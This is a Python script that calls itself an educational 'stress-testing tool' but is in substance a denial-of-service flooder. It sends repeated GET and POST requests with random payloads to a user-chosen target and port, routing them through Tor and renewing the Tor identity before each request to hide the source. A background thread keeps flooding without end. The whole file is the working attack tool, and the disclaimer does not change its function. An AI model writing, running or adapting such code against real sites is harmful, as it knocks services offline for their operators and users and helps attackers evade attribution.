import argparse
import socket
import random
import sys
import os
import time
from time import sleep
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import requests
from stem import Signal
from stem.control import Controller
import idna

def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced stress-testing tool for cyber security purposes.")
    parser.add_argument("-t", "--target", type=str, help="Target website or IP address", required=True)
    parser.add_argument("-p", "--port", type=int, help="Target port", required=True)
    parser.add_argument("-d", "--duration", type=int, help="Test duration in seconds", required=True)
    parser.add_argument("-s", "--size", type=int, help="Packet size in bytes", default=1024)
    return parser.parse_args()

def renew_tor_identity():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def send_packet(target, port, packet_size):
    renew_tor_identity()
    session = requests.Session()
    session.proxies = {
        'http': 'socks5://localhost:9050',
        'https': 'socks5://localhost:9050'
    }
    headers = {'Host': target, 'User-Agent': 'Mozilla/5.0'}
    data = random._urandom(packet_size)
    try:
        session.get(f"http://{target}:{port}", headers=headers, timeout=5)
        session.post(f"http://{target}:{port}", headers=headers, data=data, timeout=5)
    except Exception as e:
        pass

def hold_packets(target, port, packet_size):
    while True:
        send_packet(target, port, packet_size)
        time.sleep(0.01)

def main():
    print('''
      ________                                  .__           ____  __.__                __  .__    .__ 
     /  _____/  ____   ____   ________________  |  |         |    |/ _|__| _____ _____ _/  |_|  |__ |__|
    /   \  ____/ __ \ /    \_/ __ \_  __ \__  \ |  |         |      < |  |/     \\__  \\   __\  |  \|  |
    \    \_\  \  ___/|   |  \  ___/|  | \// __ \|  |__       |    |  \|  |  Y Y  \/ __ \|  | |   Y  \  |
     \______  /\___  >___|  /\___  >__|  (____  /____/       |____|__ \__|__|_|  (____  /__| |___|  /__|
            \/     \/     \/     \/           \/                     \/        \/     \/          \/    
                                 https://github.com/Wizaad/kimathi
                                   https://twitter.com/MrWizaad
    ''')
    print('*' * 99)

    args = parse_arguments()
    target = args.target
    port = args.port
    duration = args.duration
    packet_size = args.size

    print("This is an advanced stress-testing tool designed for cyber security purposes.")

    description = "In memories of Dedan Kimathi, This tool is for educational purpose only! It is a python-based stress test tool.\n"
    for char in description:
        sleep(0.1)
        sys.stdout.write(char)
        sys.stdout.flush()

    sleep(3)
    print("!" * 99)

    timeout = time.time() + duration
    sent = 0

    hold_thread = Thread(target=hold_packets, args=(target, port, packet_size))
    hold_thread.start()

    while True:
        try:
            if time.time() > timeout:
                break

            send_packet(target, port, packet_size)
            sent += 1
            print("Sent packet", sent, "to", target, "through port", port, "with size", packet_size, "bytes")

            # Perform any additional actions here

            time.sleep(1)

        except KeyboardInterrupt:
            break

    hold_thread.join()

    print('End of testing...')

if __name__ == "__main__":
    main()
